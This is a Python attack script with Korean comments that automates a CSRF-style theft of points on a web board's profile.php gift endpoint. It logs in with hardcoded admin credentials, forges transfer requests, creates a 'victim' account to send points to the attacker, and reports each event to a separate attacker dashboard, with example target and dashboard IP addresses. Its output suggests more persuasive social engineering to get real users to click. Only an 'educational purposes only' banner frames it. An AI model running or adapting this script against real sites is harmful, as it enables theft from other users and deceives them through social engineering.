# 게시글을 올려서 클릭하면 실행되는 시나리오로 하려했는데, 필터링이 너무 빡세서 일단은
# 자동화 코드로 실행시켜버리는거부터 만들었고, 대시보드에 기록도 됨

import requests
from bs4 import BeautifulSoup
import time
import json
from datetime import datetime


class ActiveCSRFAttacker:
    def __init__(self, base_url, dashboard_url):
        self.base_url = base_url.rstrip('/')
        self.dashboard_url = dashboard_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.attacker_username = 'admin'
        self.target_points = 5

    def print_section(self, title):
        print("\n" + "=" * 60)
        print(f"🎯 {title}")
        print("=" * 60)

    def login_as_attacker(self):
        """공격자로 로그인"""
        login_data = {
            'username': 'admin',
            'password': 'admin123'
        }

        response = self.session.post(f"{self.base_url}/login.php", data=login_data)

        if any(indicator in response.text.lower()
               for indicator in ['logout', 'profile', 'points']):
            print(f"[+] ✅ Attacker login success: admin")
            return True
        return False

    def check_current_points(self):
        """현재 포인트 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')

            import re
            point_patterns = [
                r'(\d+)\s*P',
                r'(\d+)\s*포인트',
                r'포인트[:\s]*(\d+)',
                r'Points[:\s]*(\d+)'
            ]

            for pattern in point_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    points = int(match.group(1))
                    print(f"[+] Current points: {points}")
                    return points

            # 페이지 제목에서도 찾기 (admin | 99 P 형태)
            title_match = re.search(r'(\d+)\s*P', response.text)
            if title_match:
                points = int(title_match.group(1))
                print(f"[+] Current points: {points}")
                return points

            print(f"[?] Points not found")
            return 0

        except Exception as e:
            print(f"[!] Error checking points: {e}")
            return 0

    def simulate_victim_click(self):
        """피해자 클릭 시뮬레이션 - 실제 CSRF 공격 실행"""
        self.print_section("Simulating Victim Click")

        print(f"[*] 실제 상황에서는 다른 사용자가 클릭해야 하지만...")
        print(f"[*] 테스트를 위해 직접 CSRF 공격을 실행합니다.")

        # 새로운 세션으로 피해자 흉내 (쿠키 없이)
        victim_session = requests.Session()
        victim_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # 1. GET 방식 CSRF 시도
        csrf_url = f"{self.base_url}/profile.php?receiver_id={self.attacker_username}&points={self.target_points}&send_gift=1&message=테스트"

        print(f"[*] Trying GET CSRF: {csrf_url}")

        try:
            response = victim_session.get(csrf_url)
            print(f"    GET response: {response.status_code}")

            if response.status_code == 200:
                self.log_to_dashboard('csrf_attempted', {'method': 'GET', 'url': csrf_url})
                return True

        except Exception as e:
            print(f"    GET CSRF failed: {e}")

        # 2. POST 방식 CSRF 시도 (로그인 없이)
        print(f"[*] Trying POST CSRF...")

        csrf_data = {
            'receiver_id': self.attacker_username,
            'points': self.target_points,
            'send_gift': '1',
            'message': '테스트'
        }

        try:
            response = victim_session.post(f"{self.base_url}/profile.php", data=csrf_data)
            print(f"    POST response: {response.status_code}")

            if response.status_code == 200:
                self.log_to_dashboard('csrf_attempted', {'method': 'POST', 'data': csrf_data})
                return True

        except Exception as e:
            print(f"    POST CSRF failed: {e}")

        return False

    def test_direct_transfer(self):
        """직접 포인트 전송 테스트"""
        self.print_section("Testing Direct Point Transfer")

        print(f"[*] 현재 로그인된 admin 계정으로 직접 포인트 전송 테스트")
        print(f"[*] 자신에게 포인트를 보내는 것이 가능한지 확인")

        # 1. 프로필 페이지에서 폼 구조 분석
        try:
            profile_response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(profile_response.text, 'html.parser')

            # 포인트 전송 폼 찾기
            forms = soup.find_all('form')
            print(f"[+] Found {len(forms)} forms on profile page")

            for i, form in enumerate(forms):
                print(f"\n    Form {i + 1}:")
                print(f"        Action: {form.get('action', 'No action')}")
                print(f"        Method: {form.get('method', 'GET')}")

                inputs = form.find_all(['input', 'select', 'textarea'])
                for inp in inputs:
                    name = inp.get('name', 'No name')
                    input_type = inp.get('type', 'text')
                    value = inp.get('value', '')
                    print(f"        • {name} ({input_type}): {value}")

        except Exception as e:
            print(f"[!] Profile analysis failed: {e}")

        # 2. 실제 포인트 전송 시도
        transfer_data = {
            'receiver_id': self.attacker_username,  # 자신에게
            'points': self.target_points,
            'send_gift': '1',
            'message': '테스트전송'
        }

        print(f"\n[*] Attempting direct transfer...")
        print(f"    From: admin")
        print(f"    To: {self.attacker_username}")
        print(f"    Points: {self.target_points}")

        try:
            response = self.session.post(f"{self.base_url}/profile.php", data=transfer_data)
            print(f"    Response: {response.status_code}")

            if "error" in response.text.lower() or "실패" in response.text:
                print(f"    [!] Transfer might have failed")
            else:
                print(f"    [+] Transfer might have succeeded")

            self.log_to_dashboard('direct_transfer_test', transfer_data)
            return True

        except Exception as e:
            print(f"    [!] Transfer failed: {e}")
            return False

    def create_victim_account_and_test(self):
        """피해자 계정 생성하여 테스트"""
        self.print_section("Creating Victim Account for Testing")

        # 1. 회원가입 시도
        victim_credentials = {
            'username': 'victim123',
            'password': 'victim123',
            'email': 'victim@test.com'
        }

        print(f"[*] Attempting to create victim account: {victim_credentials['username']}")

        # 새 세션으로 회원가입
        signup_session = requests.Session()

        try:
            # 회원가입 엔드포인트들 시도
            signup_endpoints = ['/register.php', '/signup.php', '/join.php']

            for endpoint in signup_endpoints:
                try:
                    response = signup_session.post(f"{self.base_url}{endpoint}", data=victim_credentials)
                    if response.status_code == 200:
                        print(f"    [+] Found signup endpoint: {endpoint}")
                        break
                except:
                    continue

            # 2. 피해자로 로그인
            login_response = signup_session.post(f"{self.base_url}/login.php", data={
                'username': victim_credentials['username'],
                'password': victim_credentials['password']
            })

            if any(indicator in login_response.text.lower()
                   for indicator in ['logout', 'profile', 'points']):
                print(f"    [+] Victim login successful!")

                # 3. 피해자로 공격자에게 포인트 전송
                victim_transfer_data = {
                    'receiver_id': self.attacker_username,
                    'points': self.target_points,
                    'send_gift': '1',
                    'message': 'CSRF테스트'
                }

                transfer_response = signup_session.post(f"{self.base_url}/profile.php", data=victim_transfer_data)
                print(f"    [+] Victim transfer response: {transfer_response.status_code}")

                self.log_to_dashboard('victim_transfer', {
                    'victim': victim_credentials['username'],
                    'attacker': self.attacker_username,
                    'points': self.target_points
                })

                return True

        except Exception as e:
            print(f"    [!] Victim account test failed: {e}")

        return False

    def log_to_dashboard(self, event_type, data):
        """대시보드 로그"""
        try:
            log_endpoints = [
                f"/victim?event={event_type}&data={json.dumps(data)}",
                f"/transfer?amount={self.target_points}&attacker={self.attacker_username}",
                f"/notify?type={event_type}&info=active_test"
            ]

            for endpoint in log_endpoints:
                try:
                    url = self.dashboard_url + endpoint
                    requests.get(url, timeout=5)
                    print(f"    [+] Logged: {endpoint}")
                except:
                    pass

        except Exception as e:
            print(f"[!] Dashboard logging error: {e}")

    def run_active_attack(self):
        """능동적 CSRF 공격 실행"""
        print("=" * 60)
        print("🎯 Active CSRF Attack - Direct Testing")
        print("⚠️ Educational purposes only")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print(f"Dashboard: {self.dashboard_url}")
        print("=" * 60)

        # 1. 로그인
        if not self.login_as_attacker():
            print("[-] Login failed")
            return

        initial_points = self.check_current_points()

        # 2. 다양한 방법으로 실제 포인트 이동 시도
        print(f"\n[*] Testing various attack methods...")

        # 방법 1: 직접 전송 테스트
        self.test_direct_transfer()
        time.sleep(2)

        # 방법 2: CSRF 시뮬레이션
        self.simulate_victim_click()
        time.sleep(2)

        # 방법 3: 피해자 계정 생성 테스트
        self.create_victim_account_and_test()
        time.sleep(2)

        # 3. 결과 확인
        final_points = self.check_current_points()
        gained_points = final_points - initial_points

        self.print_section("Active Attack Results")

        print(f"🎯 RESULTS:")
        print(f"    Initial points: {initial_points}")
        print(f"    Final points: {final_points}")
        print(f"    Points gained: {gained_points}")

        if gained_points > 0:
            print(f"    Status: ✅ SUCCESS! Gained {gained_points} points!")
            self.log_to_dashboard('attack_success', {
                'gained': gained_points,
                'method': 'active_testing'
            })
        else:
            print(f"    Status: ⚠️ No points gained - need real victim interaction")
            print(f"\n💡 RECOMMENDATIONS:")
            print(f"    1. 실제 다른 사용자가 게시글을 보고 링크를 클릭해야 함")
            print(f"    2. 더 매력적인 소셜 엔지니어링 필요")
            print(f"    3. 게시글을 더 눈에 띄게 만들기")

        print(f"\n📊 Dashboard: {self.dashboard_url}")
        print(f"✅ Educational purposes only!")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 active_csrf.py <target_url> <dashboard_url>")
        print("Example: python3 active_csrf.py http://43.201.154.142/ http://13.158.67.78:5000/")
        sys.exit(1)

    target = sys.argv[1]
    dashboard = sys.argv[2]

    attacker = ActiveCSRFAttacker(target, dashboard)
    attacker.run_active_attack()